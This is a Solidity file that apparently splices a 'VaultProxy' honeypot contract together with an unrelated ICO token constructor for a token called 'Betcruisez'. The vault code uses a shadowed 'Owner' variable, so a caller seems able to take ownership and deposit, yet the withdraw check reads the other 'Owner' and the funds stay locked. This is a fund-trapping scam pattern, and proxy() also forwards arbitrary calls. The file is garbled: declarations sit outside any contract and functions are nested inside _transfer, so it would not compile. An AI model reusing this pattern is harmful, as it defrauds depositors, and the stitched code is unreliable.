 

pragma solidity ^0.4.23;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
         
        target.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;


    function CustomToken() public {
        totalSupply = 300000000000000000000000000;
        name = 'Betcruisez';
        symbol = 'BCZ';
        decimals = 18;
        balanceOf[0xa7e29380eaa0f4fdb9601a06eab1791772dbd24e] = totalSupply;
        Transfer(address(0), 0xa7e29380eaa0f4fdb9601a06eab1791772dbd24e, totalSupply);

        icoRatio = 4000;
        icoBegintime = 1531191600;
        icoEndtime = 1539183600;
        icoSender = 0xa7e29380eaa0f4fdb9601a06eab1791772dbd24e;
        icoHolder = 0xa7e29380eaa0f4fdb9601a06eab1791772dbd24e;

        lockedAddresses[0xcdd751d8f54ba3ba339959f5cff0495209766742] = LockMeta({amount: 129000000000000000000000000, endtime: 1562770800});
    }

    function() public payable {
        ico();
    }
}

struct LockMeta {
    uint256 amount;
    uint256 endtime;
}

mapping (address => LockMeta) public lockedAddresses;

uint256 public icoRatio;
uint256 public icoBegintime;
uint256 public icoEndtime;
address public icoSender;
address public icoHolder;

event Transfer(address indexed from, address indexed to, uint256 value);

event ICO(address indexed from, uint256 indexed value, uint256 tokenValue);

mapping (address => uint256) public balanceOf;

uint256 public totalSupply;

string public name;
string public symbol;
uint8 public decimals;

function ico() public payable {
    require(now >= icoBegintime && now <= icoEndtime);
    uint256 tokenValue = (msg.value * icoRatio * 10 ** uint256(decimals)) / (1 ether / 1 wei);
    if (tokenValue == 0 || balanceOf[icoSender] < tokenValue) {
        revert();
    }
    _transfer(icoSender, msg.sender, tokenValue);
    ICO(msg.sender, msg.value, tokenValue);
}

function _transfer(address _from, address _to, uint _value) internal {
    require(_to != 0x0);
    require(balanceOf[_from] >= _value);
    require(balanceOf[_to] + _value > balanceOf[_to]);
    uint previousBalances = balanceOf[_from] + balanceOf[_to];
    balanceOf[_from] -= _value;
    balanceOf[_to] += _value;
    assert(balanceOf[_from] + balanceOf[_to] == previousBalances);
    Transfer(_from, _to, _value);

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            Owner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.25 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && Deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}